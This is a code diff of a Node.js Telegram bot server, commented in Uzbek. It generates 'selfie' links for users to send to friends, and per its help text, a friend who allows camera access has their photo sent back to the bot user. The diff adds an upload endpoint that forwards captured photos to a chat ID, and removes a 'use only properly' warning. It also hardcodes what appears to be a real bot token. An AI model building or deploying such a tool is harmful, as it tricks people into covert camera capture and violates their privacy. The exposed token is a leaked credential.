@@ -1,10 +1,9 @@
 import express from "express";
 import TelegramBot from "node-telegram-bot-api";
-import path, { parse } from "path";
+import path from "path";
 import { fileURLToPath } from "url";
+import multer from "multer";
 import fs from "fs";
-import { text } from "stream/consumers";
-import { url } from "inspector";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -12,34 +11,33 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Bot token
-const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
+// ✅ Bot token va baza URL
+const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA"; // o'z tokeningni yoz
 const BASE_URL = "https://korish.onrender.com";
 
-// Webhook bilan botni sozlaymiz
-const bot = new TelegramBot(TOKEN);
+// ✅ Botni webhook bilan sozlaymiz
+const bot = new TelegramBot(TOKEN, { webHook: true });
 bot.setWebHook(`${BASE_URL}/bot${TOKEN}`);
 
-// Tugmalar
+// ✅ Tugmalar
 const buttons = {
   reply_markup: {
     keyboard: [
       [{ text: "📸 Rasm olish" }, { text: "📢 Kanal" }],
       [{ text: "🆘 Yordam" }],
     ],
-
     resize_keyboard: true,
   },
 };
 
-// Webhook endpoint
+// ✅ Webhook endpoint
 app.use(express.json());
 app.post(`/bot${TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
 });
 
-// /start
+// ✅ /start
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   bot.sendMessage(
@@ -49,7 +47,7 @@ bot.onText(/\/start/, (msg) => {
   );
 });
 
-// Tugmalarni qabul qilish
+// ✅ Tugmalar
 bot.on("message", (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
@@ -60,8 +58,7 @@ bot.on("message", (msg) => {
       chatId,
       `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
     );
-  }
-  if (text === "📢 Kanal") {
+  } else if (text === "📢 Kanal") {
     bot.sendMessage(
       chatId,
       "*Kanalga qo‘shilish uchun pastdagi tugmani bosing.*",
@@ -79,23 +76,39 @@ bot.on("message", (msg) => {
         },
       }
     );
-  }
-  if (text === "🆘 Yordam") {
+  } else if (text === "🆘 Yordam") {
     bot.sendMessage(
       chatId,
-      "Shunchaki 📸 *Rasm olish* tugmasini bosing va berilgan linkni do‘stingizga yuboring.\n\nAgar do‘stingiz linkga kirib kamera ruxsatiga rozilik bildirsa, sizga uning rasmi yuboriladi.\n\n⚠️ Faqat to‘g‘ri yo‘lda foydalaning.",
+      "📸 *Rasm olish* tugmasini bosing va linkni do‘stingizga yuboring.\n\nAgar kamera ruxsatiga rozilik bildirilsa — sizga rasm keladi.",
       { parse_mode: "Markdown" }
     );
-
-    bot.sendVoice(chatId, "music/koryapman.ogg");
   }
 });
 
-// Selfie sahifa
+// ✅ Selfie sahifa
 app.get("/selfie/:id", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
+// ✅ Rasm yuklash (brauzer → server → bot)
+const upload = multer({ dest: "uploads/" });
+app.post("/upload", upload.single("photo"), async (req, res) => {
+  const { chatId } = req.body;
+  const filePath = req.file.path;
+
+  try {
+    await bot.sendPhoto(chatId, fs.createReadStream(filePath), {
+      caption: "📸 Foydalanuvchi rasmi olindi ✅",
+    });
+    fs.unlinkSync(filePath); // vaqtinchalik faylni o‘chirish
+    res.json({ ok: true });
+  } catch (err) {
+    console.error(err);
+    res.json({ ok: false });
+  }
+});
+
+// ✅ Serverni ishga tushiramiz
 app.listen(PORT, () => {
   console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
 });
